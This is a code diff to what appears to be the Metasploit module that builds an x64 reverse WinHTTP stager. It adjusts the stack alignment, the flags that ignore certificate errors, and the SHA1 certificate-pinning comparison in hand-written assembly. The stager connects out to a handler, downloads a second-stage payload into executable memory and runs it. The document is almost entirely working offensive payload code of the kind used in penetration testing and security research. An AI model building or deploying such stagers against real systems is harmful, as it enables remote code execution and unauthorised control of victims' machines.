@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/windows/x64/reverse_winhttp'
+require 'rex/payloads/meterpreter/config'
 
 module Msf
 
@@ -141,22 +142,15 @@ module Payload::Windows::ReverseWinHttp_x64
     proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
     proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])
 
-    http_open_flags = 0
-    secure_flags = 0
+    http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
+    secure_flags = (
+      0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+      0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+      0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+      0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA
 
     if opts[:ssl]
-      http_open_flags = (
-        0x00800000 | # WINHTTP_FLAG_SECURE
-        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
-
-      secure_flags = (
-        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
-        0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA
-    else
-      http_open_flags = (
-        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
+      http_open_flags |= 0x00800000 # WINHTTP_FLAG_SECURE
     end
 
     asm = %Q^
@@ -210,8 +204,8 @@ module Payload::Windows::ReverseWinHttp_x64
 
     asm << %Q^
         xor r9, r9                    ; NULL (lpszProxyBypass)
-        mov rcx, rsp                  ; Pointer to empty string ("")
         push rbx                      ; 0 for alignment
+        mov rcx, rsp                  ; Pointer to empty string ("")
         push rbx                      ; NULL (lpszProxyBypass)
         push rbx                      ; 0 (dwFlags)
         push rbx                      ; 0 for alignment
@@ -228,8 +222,6 @@ module Payload::Windows::ReverseWinHttp_x64
         ; r9 should still be 0 after the previous call, so we don't need
         ; to clear it again
         xor r9, r9                    ; 0 (dwReserved)
-        push rbx                      ; 0 for alignment
-        push rbx                      ; 0 for alignment
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
         call rbp
 
@@ -238,9 +230,8 @@ module Payload::Windows::ReverseWinHttp_x64
         db #{encoded_url}
       get_server_uri:
         pop r8                        ; Stack pointer (pwszObjectName)
-        ; r9 should still be 0 after the previous call, so we don't need
-        ; to clear it again
-        ;xor r9, r9                    ; NULL (pwszVersion)
+        xor r9, r9                    ; NULL (pwszVersion)
+        push rbx                      ; 0 for alignment
         ; the push/pop sequence saves a byte over XOR
         push rbx                      ; push 0
         pop rdx                       ; NULL (pwszVerb - defaults to GET)
@@ -248,7 +239,6 @@ module Payload::Windows::ReverseWinHttp_x64
         push 0x#{http_open_flags.to_s(16)} ; (dwFlags)
         push rbx                      ; NULL (ppwszAcceptTypes)
         push rbx                      ; NULL (pwszReferer)
-        push rbx                      ; 0 for alignment
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
         call rbp
         xchg rsi, rax                 ; save HttpRequest handle in rsi
@@ -302,10 +292,14 @@ module Payload::Windows::ReverseWinHttp_x64
         push 4
         pop r9                        ; 4 (dwBufferLength)
         push rbx                      ; 0 for alignment
+        push rbx                      ; 0 for alignment
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
         call rbp
         test eax, eax                 ; use eax, it's 1 byte less than rax
         jz failure
+        ; more alignment require as a result of this call. I have no idea why.
+        push rbx                      ; 0 for alignment
+        push rbx                      ; 0 for alignment
       ^
     end
 
@@ -327,7 +321,16 @@ module Payload::Windows::ReverseWinHttp_x64
         push rbx                      ; push 0 (dwContext)
         push rbx                      ; push 0 (dwTotalLength)
         push rbx                      ; push 0 (dwOptionalLength)
+    ^
+
+    # required extra alignment for non-ssl payloads. Still don't know why.
+    unless opts[:ssl]
+      asm << %Q^
         push rbx                      ; 0 for alignment
+      ^
+    end
+
+    asm << %Q^
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
         call rbp
         test eax, eax                 ; use eax, it's 1 byte less than rax
@@ -369,9 +372,9 @@ module Payload::Windows::ReverseWinHttp_x64
         ; worry about adding something to the stack to have space for the cert pointer,
         ; so we won't worry about doing it, it'll save us bytes!
         mov r8, rsp                   ; Stack pointer (lpBuffer)
+        mov r14, r8                   ; Back the stack pointer up for later use
         push 8                        ; One whole pointer
         mov r9, rsp                   ; Stack pointer (lpdwBufferLength)
-        push rbx                      ; 0 for alignment
         push rbx                      ; 0 for alignment
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
         call rbp
@@ -379,14 +382,15 @@ module Payload::Windows::ReverseWinHttp_x64
         jz failure                    ; Bail out if we couldn't get the certificate context
 
       ssl_cert_get_server_hash:
-        mov rcx, [r9]                 ; Cert context pointer (pCertContext)
-        push 20                       ; length of the sha1 hash
+        mov rcx, [r14]                ; Cert context pointer (pCertContext)
+        push 32                       ; sha1 length, rounded to multiple of 16
         mov r9, rsp                   ; Address of length (pcbData)
+        mov r15, rsp                  ; Backup address of length
         sub rsp, [r9]                 ; Allocate 20 bytes for the hash output
         mov r8, rsp                   ; 20 byte buffer (pvData)
+        mov r14, r8                   ; Back the stack pointer up for later use
         push 3
         pop rdx                       ; CERT_SHA1_HASH_PROP_ID (dwPropId)
-        ; TODO: cater for alignment?
         mov r10, #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
         call rbp
         test eax, eax                 ; use eax instead of rax, saves a byte
@@ -397,11 +401,13 @@ module Payload::Windows::ReverseWinHttp_x64
         db #{encoded_cert_hash}
 
       ssl_cert_compare_hashes:
-        pop rsi                       ; get the expected hash
-        mov rdi, r8                   ; pointer to the retrieved hash
-        mov rcx, [r9]                 ; number of bytes to compare
+        pop rax                       ; get the expected hash
+        xchg rax, rsi                ; swap hash and handle for now
+        mov rdi, r14                  ; pointer to the retrieved hash
+        mov rcx, [r15]                ; number of bytes to compare
         repe cmpsb                    ; do the hash comparison
         jnz failure                   ; Bail out if the result isn't zero
+        xchg rax, rsi                ; swap hash and handle back!
 
       ; Our certificate hash was valid, hurray!
       ^
@@ -429,7 +435,6 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r8, 0x1000                ; MEM_COMMIT (flAllocationType)
         push 0x40                     ; PAGE_EXECUTE_READWRITE
         pop r9                        ; (flProtect)
-        ; TODO: cater for alignment?
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                      ; Call VirtualAlloc(...);
 
@@ -446,7 +451,7 @@ module Payload::Windows::ReverseWinHttp_x64
         mov r9, rdi                   ; Size received (lpNumberOfBytesRead)
         mov r10, #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
         call rbp
-        add rsp, 32                  ; clean up reserved space
+        add rsp, 32                   ; clean up reserved space
 
         test eax, eax                 ; use eax instead of rax, saves a byte
         jz failure
